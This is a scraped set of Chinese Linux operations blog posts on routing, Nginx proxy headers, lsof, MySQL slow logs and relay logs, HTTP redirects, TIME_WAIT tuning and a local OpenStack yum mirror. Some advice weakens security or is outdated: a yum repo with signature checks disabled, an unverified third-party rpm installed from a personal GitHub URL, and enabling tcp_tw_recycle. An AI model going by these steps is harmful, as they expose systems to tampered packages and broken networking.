静态路由和默认路由的特点1234静态路由特点:路由表是手工设置的,除非网络管理员干预，否则静态路由不会发生变化；路由表的形成不需要占用网络资源；适用环境：一般用于网络规模很小、拓扑结构固定的网络中。 123默认路由特点:在所有路由类型中，默认路由的优先级最低适用环境：一般应用在只有一个出口的末端网络中或作为其他路由的补充 123浮动静态路由：路由表中存在相同目标网络的路由条目时，根据路由条目优先级的高低，将请求转发到相应端口；链路冗余的作用； 路由器转发数据包时的封装过程1源IP和目标IP不发生变化，在网络的每一段传输时，源和目标MAC发生变化，进行重新封装，分别是每一段的源和目标地址 要完成对数据包的路由，一个路由器必须至少了解以下内容1234567891011121314a）目的地址b）相连路由器，并可以从哪里获得远程网络的信息c）到所有远程网络的可能路由d）到达每个远程网络的最佳路由e）如何维护并验证路由信息f）路由和交换的对比路由工作在网络层 a)根据“路由表”转发数据 b)路由选择 c)路由转发交换工作在数据链路层 d)根据“MAC地址表”转发数据 e)硬件转发 路由相关操作使用route -n命令查看Linux内核路由表12345678910111213141516171819202122[root@repo100 ~]# route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface0.0.0.0 10.0.10.1 0.0.0.0 UG 100 0 0 eno1678003210.0.10.0 0.0.0.0 255.255.255.0 U 100 0 0 eno16780032Destination:目标网段或主机Gateway: 网关地址Genmask：网络掩码Flags: 标记 U -- 表示路由是活动的 H -- 表示目标是一个主机 G -- 表示路由指向网关 R -- 表示恢复动态路由产生的表项 D -- 由路由的后台程序动态的安装 M -- 由路由的后台程序修改 ！-- 拒绝路由Metric: 路由距离Ref: 路由项引用次数Use: 此路由项被路由软件查找的次数Iface: 该路由表项对应的输出接口 三种路由类型说明123456(1)主机路由主机路由是路由选择表中指向单个IP地址或主机名的路由记录。主机路由的Flags字段为H。例如，在下面的示例中，本地主机通过IP地址192.168.1.1的路由器到达IP地址为10.0.0.10的主机。Destination Gateway Genmask Flags Metric Ref Use Iface----------- ------- ------- ----- ------ --- --- -----10.0.0.10 192.168.1.1 255.255.255.255 UH 0 0 0 eth0 123456(2)网络路由网络路由是代表主机可以到达的网络。网络路由的Flags字段为N。例如，在下面的示例中，本地主机将发送到网络192.19.12的数据包转发到IP地址为192.168.1.1的路由器。Destination Gateway Genmask Flags Metric Ref Use Iface----------- ------- ------- ----- ----- --- --- -----192.19.12 192.168.1.1 255.255.255.0 UN 0 0 0 eth0 123456(3)默认路由当主机不能在路由表中查找到目标主机的IP地址或网络路由时，数据包就被发送到默认路由（默认网关）上。默认路由的Flags字段为G。例如，在下面的示例中，默认路由是IP地址为192.168.1.1的路由器。Destination Gateway Genmask Flags Metric Ref Use Iface----------- ------- ------- ----- ------ --- --- -----default 192.168.1.1 0.0.0.0 UG 0 0 0 eth0 route命令格式详解1234567891011121314设置和查看路由表都可以用 route 命令，设置内核路由表的命令格式是：route [add|del] [-net|-host] target [netmask Nm] [gw Gw] [[dev] If]参数解释：add 添加一条路由规则del 删除一条路由规则-net 目的地址是一个网络-host 目的地址是一个主机target 目的网络或主机netmask 目的地址的网络掩码gw 路由数据包通过的网关dev 为路由指定的网络接口 route命令使用举例123添加到主机的路由route add -host 192.168.1.2 dev eth0:0route add -host 10.20.30.148 gw 10.20.30.40 1234添加到网络的路由route add -net 10.20.30.40 netmask 255.255.255.248 eth0route add -net 10.20.30.48 netmask 255.255.255.248 gw 10.20.30.41route add -net 192.168.1.0&#x2F;24 eth1 12添加默认路由route add default gw 192.168.1.1 123456789删除路由route del -host 192.168.1.2 dev eth0:0route del -host 10.20.30.148 gw 10.20.30.40route del -host 10.20.30.40 netmask 255.255.255.248 eth0route del -net 10.20.30.48 netmask 255.255.255.248 gw 10.20.30.41route del -net 192.168.1.0&#x2F;24 eth1route del default gw 192.168.1.1注：route del default命令会删除所有默认路由,操作需谨慎 添加一条默认路由12345添加一条默认路由route add default gw 10.0.0.1 &#x2F;&#x2F;默认只在内存中生效永久生效：追加到&#x2F;etc&#x2F;rc.local文件里（CentOS7需要给文件执行权限）echo &quot;route add default gw 10.0.0.1&quot; &gt;&gt;&#x2F;etc&#x2F;rc.local 添加一条静态路由12345添加一条静态路由route add -net 192.168.2.0&#x2F;24 gw 192.168.2.254永久生效：echo &quot;any net 192.168.2.0&#x2F;24 gw 192.168.2.254&quot; &gt;&gt;&#x2F;etc&#x2F;sysconfig&#x2F;static-routes 添加到一台主机的静态路由12345route add -host 192.168.2.2 gw 192.168.2.254永久生效：echo &quot;any host 192.168.2.2 gw 192.168.2.254&quot; &gt;&gt;&#x2F;etc&#x2F;sysconfig&#x2F;static-routes 注：Linux 默认没有此文件,该命令会自动创建。 开启linux内核的包转发功能12345678在Linux中默认的内核配置已经包含了路由功能，但默认并没有在系统启动时启用此功能永久开启路由功能 # vim &#x2F;etc&#x2F;sysctl.confnet.ipv4.ip_forward &#x3D; 1配置生效sysctl -p 使用ip route命令配置静态路由12345678910添加静态路由到路由表的语法如下：ip route [destination_network] [mask] [next-hop_address] administrative_distance]参数解析：ip route 用于创建静态路由的命令。Destination_network 需要发布到路由表中的网段。Mask 在这一网络上使用的子网掩码。Next-hop_address 下一跳路由器的地址。administrative_distance 默认时，静态路由有一个取值为1 的管理性距离。在这个命令的尾部添加管理权来修改这个默认值。 123例如ip route 172.16.1.0 255.255.255.0 172.16.2.1 1234查看路由表除了使用route -n命令外，还可以使用ip route[root@repo100 ~]# ip routedefault via 10.0.10.1 dev eno16780032 proto static metric 100 10.0.10.0&#x2F;24 dev eno16780032 proto kernel scope link src 10.0.10.100 metric 100 实例1 1如上图所示, PC0机器和PC1机器之间经过两个路由器，要想使这两台机器通信，路由设置如下： 12345(1)Route0路由器设置：ip add 192.168.1.1 255.255.255.0ip add 192.168.2.1 255.255.255.0ip route 192.168.3.0 255.255.255.0 192.168.2.2 12345(2)Route1路由器设置：ip add 192.168.2.2 255.255.255.0ip add 192.168.3.1 255.255.255.0ip route 192.168.1.0 255.255.255.0 192.168.2.1 实例2 12345如上图所示，使用A主机192.168.1.2能够ping通E主机192.168.4.2，这两台机能够通信。操作思路：1）在主机B上设置默认路由下一跳为192.168.2.2，并开启路由转发功能；2）在主机C上设置2条静态路由，分别去192.168.1.0&#x2F;24网段的下一跳为192.168.2.1，去192.168.4.0&#x2F;24网段的下一跳为192.168.3.2，并开启路由转发功能；3）在主机D上设置默认路由下一跳为192.168.3.1，并开启路由转发功能。 123456789101112131415161718192021222324252627操作纪录：1）A主机上操作：ip为192.168.1.2，设置网关为192.168.1.1 route add default gw 192.168.1.12）B主机上操作：第一块网卡为192.168.1.1，第二块网卡为192.168.2.1 (2.1)B主机设置默认路由，下一跳为192.168.2.2 route add default gw 192.168.2.2 (2.2)B主机开启路由转发功能 echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward3）C主机上操作：第一块网卡为192.168.2.2，第二块网卡为192.168.3.1 (3.1)C主机设置2条默认路由 route add -net 192.168.1.0&#x2F;24 gw 192.168.2.1 route add -net 192.168.4.0&#x2F;24 gw 192.168.3.2 (3.2)C主机开启路由转发功能 echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward4）D主机上操作：第一块网卡为192.168.3.2，第二块网卡为192.168.4.1 (4.1)D主机设置默认路由，下一跳为192.168.3.1 route add default gw 192.168.3.1 (4.2)D主机开启路由转发功能 echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward 5）E主机上操作：ip为192.168.4.2，设置网关为192.168.4.1 route add default gw 192.168.4.1 参考: 腾讯云社区","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Linux","slug":"Linux","permalink":"https://garywu520.github.io/tags/Linux/"},{"name":"Route","slug":"Route","permalink":"https://garywu520.github.io/tags/Route/"},{"name":"静态路由","slug":"静态路由","permalink":"https://garywu520.github.io/tags/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/"},{"name":"默认路由","slug":"默认路由","permalink":"https://garywu520.github.io/tags/%E9%BB%98%E8%AE%A4%E8%B7%AF%E7%94%B1/"},{"name":"路由配置","slug":"路由配置","permalink":"https://garywu520.github.io/tags/%E8%B7%AF%E7%94%B1%E9%85%8D%E7%BD%AE/"}]},{"title":"X-Forward-For详解","slug":"Nginx信息头配置-proxy-set-header","date":"2018-04-03T07:51:36.000Z","updated":"2018-04-03T08:16:26.424Z","comments":true,"path":"2018/04/03/Nginx信息头配置-proxy-set-header/","link":"","permalink":"https://garywu520.github.io/2018/04/03/Nginx%E4%BF%A1%E6%81%AF%E5%A4%B4%E9%85%8D%E7%BD%AE-proxy-set-header/","excerpt":"12当nginx作为反向代理功能时，转发请求到后端服务器。通常需要使用如下命令为转发的请求增加请求头 X-Forwarded-For","text":"12当nginx作为反向代理功能时，转发请求到后端服务器。通常需要使用如下命令为转发的请求增加请求头 X-Forwarded-For 12345X-Forwarded-For请求头格式: X-Forwarded-For:client, proxy1, proxy2如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP分别为 IP1、IP2、IP3，用户真实 IP 为IP0，那么按照 XFF 标准，服务端最终会收到以下信息：X-Forwarded-For: IP0, IP1, IP2 所以nginx做负载均衡的时候，想要获取用户真实IP地址怎么办？ 123在nginx反向代理服务器-配置文件中【一般是location字段】添加如下配置proxy set header X-Forwarded-For $remote_addr; 所以nginx做负载均衡的时候，同时支持后端配置多个虚拟主机？ 123在nginx反向代理服务器-配置文件中【一般是location字段】添加如下配置Proxy set header Host $host; 最新版(内置变量)配置1proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 最新版(内置变量)配置-参考官方：X-Forwarded-For","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"},{"name":"proxy-set-header","slug":"proxy-set-header","permalink":"https://garywu520.github.io/tags/proxy-set-header/"},{"name":"Host","slug":"Host","permalink":"https://garywu520.github.io/tags/Host/"},{"name":"X-Forward-For","slug":"X-Forward-For","permalink":"https://garywu520.github.io/tags/X-Forward-For/"}]},{"title":"Linux文件句柄以及空间释放问题","slug":"Linux文件句柄以及空间释放问题","date":"2018-04-03T07:09:29.000Z","updated":"2018-04-03T07:16:51.638Z","comments":true,"path":"2018/04/03/Linux文件句柄以及空间释放问题/","link":"","permalink":"https://garywu520.github.io/2018/04/03/Linux%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E4%BB%A5%E5%8F%8A%E7%A9%BA%E9%97%B4%E9%87%8A%E6%94%BE%E9%97%AE%E9%A2%98/","excerpt":"1在生产环境中,经常遇到这样的问题。另一个程序正在运行，而你把它的运行所相关的文件给删除了，导致空间并未被真正释放","text":"1在生产环境中,经常遇到这样的问题。另一个程序正在运行，而你把它的运行所相关的文件给删除了，导致空间并未被真正释放 正式使用lsof命令排查12第一种情况: 如果知道相关文件或进程名称，则lsof |grep rsyncd 1234如果不知道是哪个程序在占用，则需要使用如下命令lsof |grep deleted注：这个deleted表示已经删除了的文件，但是文件句柄未释放,这个命令会把所有的未释放文件句柄的进程列出来 1查找出结果后, 如果是一个服务在占用，则reload或重启服务即可释放；如果是文件进程,则直接 kill+进程号即可","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Linux","slug":"Linux","permalink":"https://garywu520.github.io/tags/Linux/"},{"name":"文件句柄","slug":"文件句柄","permalink":"https://garywu520.github.io/tags/%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84/"},{"name":"lsof","slug":"lsof","permalink":"https://garywu520.github.io/tags/lsof/"},{"name":"空间释放","slug":"空间释放","permalink":"https://garywu520.github.io/tags/%E7%A9%BA%E9%97%B4%E9%87%8A%E6%94%BE/"}]},{"title":"MySQL慢查询mysqldumpslow","slug":"MySQL慢查询mysqldumpslow","date":"2018-04-03T06:17:23.000Z","updated":"2018-04-03T07:04:01.551Z","comments":true,"path":"2018/04/03/MySQL慢查询mysqldumpslow/","link":"","permalink":"https://garywu520.github.io/2018/04/03/MySQL%E6%85%A2%E6%9F%A5%E8%AF%A2mysqldumpslow/","excerpt":"认识mysqldumpslow1mysqldumpslow 是一个针对于 MySQL 慢查询的命令行程序。在配置 MySQL 相关参数后，可以通过 mysqldumpslow 查找出查询较慢的 SQL 语句。","text":"认识mysqldumpslow1mysqldumpslow 是一个针对于 MySQL 慢查询的命令行程序。在配置 MySQL 相关参数后，可以通过 mysqldumpslow 查找出查询较慢的 SQL 语句。 查看是否开启慢查询123456789101112131415161718192021mysql&gt; show variables like &quot;%quer%&quot; ;+---------------------------------------+------------------------------------+| Variable_name | Value |+---------------------------------------+------------------------------------+| binlog_rows_query_log_events | OFF || ft_query_expansion_limit | 20 || have_query_cache | YES || log_queries_not_using_indexes | OFF || log_throttle_queries_not_using_indexes| 0 || long_query_time | 10.000000 || query_alloc_block_size | 8192 || query_cache_limit | 1048576 || query_cache_min_res_unit | 4096 || query_cache_size | 1048576 || query_cache_type | OFF || query_cache_wlock_invalidate | OFF || query_prealloc_size | 8192 || slow_query_log | OFF || slow_query_log_file | &#x2F;usr&#x2F;local&#x2F;var&#x2F;mysql&#x2F;mysql-slow.log|+---------------------------------------+------------------------------------+15 rows in set (0.01 sec) 123456与 mysqldumpslow 相关的配置变量:slow_query_log：是否开启慢查询日志long_query_time：是否设置慢查询的 SQL 执行规定时间slow_query_log_file：设置慢查询日志记录位置log_queries_not_using_indexes：是否设置了把没有索引的记录到慢查询日志 配置文件启用慢查询12345678910111213#开启慢查询日志slow_query_log&#x3D;on;#设置没有索引的记录到慢查询日志log_queries_not_using_indexes&#x3D;on;#设置到慢查询日志的 SQL 执行时间（1 代表 1 秒）long_query_time&#x3D;1;#设置慢查询日志的存放位置slow_query_log_file&#x3D;&quot;&#x2F;Users&#x2F;LuisEdware&#x2F;Code&#x2F;output&#x2F;mysql-slow.log&quot;;重启mysql mysqldumpslow使用1234567891011121314151617181920格式：-s, 是表示按照何种方式排序， c: 出现次数 l: 锁定时间 r: 返回记录 t: 查询时间 al:平均锁定时间 ar:平均返回记录数 at:平均查询时间-t, 是top n的意思，即为返回前面多少条的数据；-g, 后边可以写一个正则匹配模式 12345678910111213141516171819只需分析处理速度最慢的10条sql：mysqldumpslow -t 10 &#x2F;database&#x2F;mysql&#x2F;mysql06_slow.log分析出使用频率最高的前50条慢sql：mysqldumpslow -s c -t 50 &#x2F;database&#x2F;mysql&#x2F;mysql06_slow.log得到访问次数最多的10个SQLmysqldumpslow -s c -t 10 &#x2F;database&#x2F;mysql&#x2F;mysql06_slow.log得到返回记录集最多的10个SQL。mysqldumpslow -s r -t 10 &#x2F;database&#x2F;mysql&#x2F;mysql06_slow.log得到按照时间排序的前10条里面含有左连接的查询语句。mysqldumpslow -s t -t 10 -g “left join” &#x2F;database&#x2F;mysql&#x2F;mysql06_slow.log另外建议在使用这些命令时结合 | 和more 使用 ，否则有可能出现刷屏的情况。mysqldumpslow -s r -t 20 &#x2F;mysqldata&#x2F;mysql&#x2F;mysql06-slow.log | more根据返回结果，进行进一步建立索引等优化即可。 参考：luisedware","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"慢查询","slug":"慢查询","permalink":"https://garywu520.github.io/tags/%E6%85%A2%E6%9F%A5%E8%AF%A2/"},{"name":"mysqldumpslow","slug":"mysqldumpslow","permalink":"https://garywu520.github.io/tags/mysqldumpslow/"}]},{"title":"HTTP状态码301和302的区别","slug":"HTTP状态码301和302的区别","date":"2018-04-03T04:17:03.000Z","updated":"2018-04-04T07:39:32.310Z","comments":true,"path":"2018/04/03/HTTP状态码301和302的区别/","link":"","permalink":"https://garywu520.github.io/2018/04/03/HTTP%E7%8A%B6%E6%80%81%E7%A0%81301%E5%92%8C302%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"1简单理解：301是永久重定向，而302是临时重定向。 当然，他们之间也是有共同点的，就是用户都可以看到url替换为了一个新的，然后发出请求。","text":"1简单理解：301是永久重定向，而302是临时重定向。 当然，他们之间也是有共同点的，就是用户都可以看到url替换为了一个新的，然后发出请求。 301适合永久重定向12345301比较常用的场景是: 使用域名跳转。比如，我们访问 http:&#x2F;&#x2F;www.baidu.com 会跳转到 https:&#x2F;&#x2F;www.baidu.com，发送请求之后，就会返回301状态码，然后返回一个location，提示新的地址，浏览器就会拿着这个新的地址去访问。 注意： 301请求是可以缓存的，即通过看status code，可以发现后面写着from cache。或者你把你的网页的名称从php修改为了html，这个过程中，也会发生永久重定向。 302用来做临时跳转123比如未登陆的用户访问用户中心重定向到登录页面。访问404页面会重新定向到首页。 Nginx 301/302配置123456rewrite后面接上permanent就代表301跳转, 例如:&#x2F;&#x2F;把来自veryyoung.me的请求301跳到 www.veryyoung.meif ($host !&#x3D; &#39;veryyoung.me&#39;) &#123; rewrite ^&#x2F;(.*)$ http:&#x2F;&#x2F;www.veryyoung.me&#x2F;$1 permanent;&#125; 123456接上redirect就代表302跳转&#x2F;&#x2F;把来自veryyoung.me的请求302跳到 www.veryyoung.meif ($host !&#x3D; &#39;veryyoung.me&#39;) &#123; rewrite ^&#x2F;(.*)$ http:&#x2F;&#x2F;www.veryyoung.me&#x2F;$1 redirect;&#125; 301与302的区别123302重定向只是暂时的重定向，搜索引擎会抓取新的内容而保留旧的地址，因为服务器返回302，所以，搜索搜索引擎认为新的网址是暂时的。而301重定向是永久的重定向，搜索引擎在抓取新的内容的同时也将旧的网址替换为了重定向之后的网址。 参考：Wayne Zhu","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"HTTP状态码","slug":"HTTP状态码","permalink":"https://garywu520.github.io/tags/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/"},{"name":"301","slug":"301","permalink":"https://garywu520.github.io/tags/301/"},{"name":"302","slug":"302","permalink":"https://garywu520.github.io/tags/302/"}]},{"title":"Nginx upstream模块配置-官方翻译版","slug":"Nginx-upstream模块配置-官方翻译版","date":"2018-04-03T03:50:27.000Z","updated":"2018-04-03T04:11:18.293Z","comments":true,"path":"2018/04/03/Nginx-upstream模块配置-官方翻译版/","link":"","permalink":"https://garywu520.github.io/2018/04/03/Nginx-upstream%E6%A8%A1%E5%9D%97%E9%85%8D%E7%BD%AE-%E5%AE%98%E6%96%B9%E7%BF%BB%E8%AF%91%E7%89%88/","excerpt":"1ngx_http_upstream_module 模块用于定义可以被proxy_pass, fastcgi_pass, uwsgi_pass, scgi_pass和memcached_pass指令引用的服务器集群。","text":"1ngx_http_upstream_module 模块用于定义可以被proxy_pass, fastcgi_pass, uwsgi_pass, scgi_pass和memcached_pass指令引用的服务器集群。 配置范例1234567891011121314upstream backend &#123; server backend1.example.com weight&#x3D;5; server backend2.example.com:8080; server unix:&#x2F;tmp&#x2F;backend3; server backup1.example.com:8080 backup; server backup2.example.com:8080 backup;&#125;server &#123; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;backend; &#125;&#125; upstream指令1upstream指令用于定义服务器集群。服务器可以监听在不同端口。另外，监听在TCP和UNIX-domain socket的服务器可以混合使用 upstream范例1234567upstream backend &#123; server backend1.example.com weight&#x3D;5; server 127.0.0.1:8080 max_fails&#x3D;3 fail_timeout&#x3D;30s; server unix:&#x2F;tmp&#x2F;backend3; server backup1.example.com backup;&#125; 1234567默认，使用带权重的round-robin平衡算法将请求分派到服务器。在上面的例子中， 每7个请求将被如下分配：5个请求去backend1.example.com1个请求去127.0.0.1:80801个请求去unix:&#x2F;tmp&#x2F;backend3在和某台服务器通讯的过程中，如果发生错误， 请求将被分派给下一个服务器， 以此类推直到所有可用服务器都被尝试。如果没有任何一个服务器可以可以返回成功的应答，则客户端将会收到和最后一台机器的通讯结果。 server指令12server指令用于定义一台服务器的地址和其他参数。地址可以是域名或者IP地址，端口可选，或者是以&quot;unix:&quot;前缀指定的UNIX-domain socket路径。如果端口没有指定，将使用80端口。可以解析为多个IP地址的域名将一次性定义多台服务器。 123456789101112131415161718下面是可用的参数列表:weight&#x3D;number设置服务器的权重，默认为1.max_fails&#x3D;number定义在参数fail_timeout定义的时间内，与服务器通讯的不成功的数量。默认情况，不成功尝试次数被设置为1.如果设置为0则关闭尝试计数。fail_timeout&#x3D;time在此时间段期间与服务器通讯的不成功尝试，以判断服务器是否不可到达和服务器被判定为不可到达的时间注：如果设置为max_fails&#x3D;5;fail_timeout&#x3D;30s，表示如果有5次请求失败，则该服务器被断定为不可到达，之后30s之内将不再尝试这台机器。再之后的每30s，都将进行最多5次尝试，如果继续失败则继续判断为不可到达并不再尝试。backup标记当前服务器为备用服务器。当主服务器(注：应该是没有标记为backup和down的服务器)都不能达到时,请求将被分派到backup服务器上。down将当前服务器标记为永久不可到达。 ip-hash指令123指定集群使用的负载均衡算法，基于客户端IP地址将请求分派给服务器。这个算法保证从同一个客户端来的请求总是被分派到同样的服务器，除非这个服务器不可达到。后面这种情况下客户端请求将被分派到其他服务器。大多数情况，请求总是被分派到同一个服务器。如果某台服务器需要被永久移除，那么应该将它标记为down以便保持当前的客户端IP地址的哈希。 123456789例如：upstream backend &#123; ip_hash; server backend1.example.com; server backend2.example.com; server backend3.example.com down; server backend4.example.com;&#125; least_conn指令1指定集群应该使用的负载均衡方法，分派请求到活动连接数量最少的服务器。如果有多台这样的服务器，这些服务器将尝试轮流使用带权重的round-robin平衡算法。 123456789例如：upstream backend &#123; least_conn; server backend1.example.com; server backend2.example.com; server backend3.example.com down; server backend4.example.com;&#125; 参考：敖小剑的博客","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"},{"name":"upstream","slug":"upstream","permalink":"https://garywu520.github.io/tags/upstream/"}]},{"title":"TIME_WAIT过多-问题处理","slug":"TIME-WAIT过多-问题处理","date":"2018-04-03T02:18:02.000Z","updated":"2018-04-03T02:48:36.350Z","comments":true,"path":"2018/04/03/TIME-WAIT过多-问题处理/","link":"","permalink":"https://garywu520.github.io/2018/04/03/TIME-WAIT%E8%BF%87%E5%A4%9A-%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86/","excerpt":"TIME_WAIT状态原理 1当客户端主动关闭连接时，会发送最后一个ack，然后会进入TIME_WAIT状态，再停留2个MSL时间(约1-4分钟)，进入CLOSED状态。","text":"TIME_WAIT状态原理 1当客户端主动关闭连接时，会发送最后一个ack，然后会进入TIME_WAIT状态，再停留2个MSL时间(约1-4分钟)，进入CLOSED状态。 如何获取TCP/IP四个状态？ 12345678# netstat -a 命令可以获取以下四个状态LISTENING CLOSE_WAITTIME_WAITESTABLISHED统计TIME_WAIT状态数量netstat -a|grep TIME_WAIT|wc -l 【php环境】如果TIME_WAIT数量过多，如何处理？ 1234567891011121314151617修改内核配置，编辑文件，加入以下内容：net.ipv4.tcp_syncookies &#x3D; 1net.ipv4.tcp_tw_reuse &#x3D; 1net.ipv4.tcp_tw_recycle &#x3D; 1net.ipv4.tcp_fin_timeout &#x3D; 30 然后执行 &#x2F;sbin&#x2F;sysctl -p 让参数生效。参数:net.ipv4.tcp_syncookies &#x3D; 1 表示开启SYN Cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击，默认为0，表示关闭；net.ipv4.tcp_tw_reuse &#x3D; 1 表示开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭；net.ipv4.tcp_tw_recycle &#x3D; 1 表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0，表示关闭。net.ipv4.tcp_fin_timeout 修改系統默认的 TIMEOUT 时间 【JAVA环境】如果TIME_WAIT数量过多，如何处理？ 12找开发！找开发！找开发！基本都是代码问题导致","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"TCP/IP","slug":"TCP-IP","permalink":"https://garywu520.github.io/tags/TCP-IP/"},{"name":"TIME_WAIT过多","slug":"TIME-WAIT过多","permalink":"https://garywu520.github.io/tags/TIME-WAIT%E8%BF%87%E5%A4%9A/"},{"name":"内核","slug":"内核","permalink":"https://garywu520.github.io/tags/%E5%86%85%E6%A0%B8/"},{"name":"net.ipv4","slug":"net-ipv4","permalink":"https://garywu520.github.io/tags/net-ipv4/"}]},{"title":"部署openstack各版本-本地yum源","slug":"部署openstack本地yum源","date":"2018-03-27T06:50:29.000Z","updated":"2018-05-23T09:00:59.208Z","comments":true,"path":"2018/03/27/部署openstack本地yum源/","link":"","permalink":"https://garywu520.github.io/2018/03/27/%E9%83%A8%E7%BD%B2openstack%E6%9C%AC%E5%9C%B0yum%E6%BA%90/","excerpt":"1部署本地openstack yum源，原因主要是我想安装老版本，比如N版(newton),而由于官方新版本的发布，官方取消了老版本的yum源。其次是部署本地yum源，安装速度更快。 访问：老版本CentOS openstack yum源","text":"1部署本地openstack yum源，原因主要是我想安装老版本，比如N版(newton),而由于官方新版本的发布，官方取消了老版本的yum源。其次是部署本地yum源，安装速度更快。 访问：老版本CentOS openstack yum源 1. 使用apache提供yum服务1yum install -y httpd 优化Apache目录浏览 123456789vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&lt;Directory &quot;&#x2F;vaw&#x2F;www&#x2F;html&#x2F;newton&quot;&gt; Options Indexes FollowSymLinks IndexOptions NameWidth&#x3D;80 Charset&#x3D;UTF-8 AllowOverride None Order allow,deny Allow from all&lt;&#x2F;Directory&gt; 2. 同步远程仓库到本地12345678同步方式很原始，把源站所有rpm包及repodata目录wget到本地即可在网站根目录下载整个目录cd &#x2F;var&#x2F;www&#x2F;html开启tmux下载wget -c -r -np -k -L -p https:&#x2F;&#x2F;buildlogs.centos.org&#x2F;centos&#x2F;7&#x2F;cloud&#x2F;x86_64&#x2F;openstack-newton&#x2F;mv buildlogs.centos.org&#x2F;centos&#x2F;7&#x2F;cloud&#x2F;x86_64&#x2F;openstack-newton newtonchown -R apache.apache &#x2F;var&#x2F;www&#x2F;html&#x2F; 3. 启动httpd服务123然后启动httpd服务，其他机器通过httpd服务来访问yum源systemctl start httpdsystemctl enable httpd 4. openstack所有节点配置123456789101112vim &#x2F;etc&#x2F;yum.repos.d&#x2F;openstack-newtron.repo[openstack-local]name&#x3D;openstack-newtronbaseurl&#x3D;http:&#x2F;&#x2F;10.0.10.100&#x2F;enabled&#x3D;1 gpgcheck&#x3D;0注：enabled&#x3D;1 说明启用这个更新库，0表示不启用。 gpgcheck&#x3D;0 表示不使用gpg文件来检查软件包的签名更新yum缓存yum clean all &amp; yum makecache 注：其他OpenStack版本本地yum源制作方法类似,不再赘述。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"openstack","slug":"openstack","permalink":"https://garywu520.github.io/tags/openstack/"},{"name":"本地yum","slug":"本地yum","permalink":"https://garywu520.github.io/tags/%E6%9C%AC%E5%9C%B0yum/"}]},{"title":"mysql从库自动清理relay_log","slug":"mysql从库自动清理relay-log","date":"2018-03-22T07:10:29.000Z","updated":"2018-03-27T11:39:26.344Z","comments":true,"path":"2018/03/22/mysql从库自动清理relay-log/","link":"","permalink":"https://garywu520.github.io/2018/03/22/mysql%E4%BB%8E%E5%BA%93%E8%87%AA%E5%8A%A8%E6%B8%85%E7%90%86relay-log/","excerpt":"1生产环境部署有MySQL从库, 但一段时间后发现，SQL线程执行后的relay log一直堆积并未自动删除。","text":"1生产环境部署有MySQL从库, 但一段时间后发现，SQL线程执行后的relay log一直堆积并未自动删除。 1正常情况下, 这些日志是可以被自动清理的。但实际上这些文件并没有被清理,原因可能是版本bug导致。 12345678另一种方法是修改my.cnf文件, 添加如下两个参数vim &#x2F;etc&#x2F;my.cnf#clean relay logrelay-log-purge&#x3D;1 relay-log-space-limit&#x3D;10G 第一个参数值为1表示启用relay log清理；第二个参数设置relay log保留的最大限制为10G, 当超过这个限制, 从库IO线程暂停同步, 直到SQL清理完relay log后IO线程才继续同步。 1234567安装mha，使用自带工具purge_relay_logsyum install -y perl-DBD-MySQLwget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;yyueshui&#x2F;mysql-master-ha-rpm&#x2F;master&#x2F;mha4mysql-node-0.56-0.el6.noarch.rpmrpm -ivh mha4mysql-node-0.56-0.el6.noarch.rpmwhich purge_relay_logs重启mysql服务,观察","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"mysql slave","slug":"mysql-slave","permalink":"https://garywu520.github.io/tags/mysql-slave/"},{"name":"relay 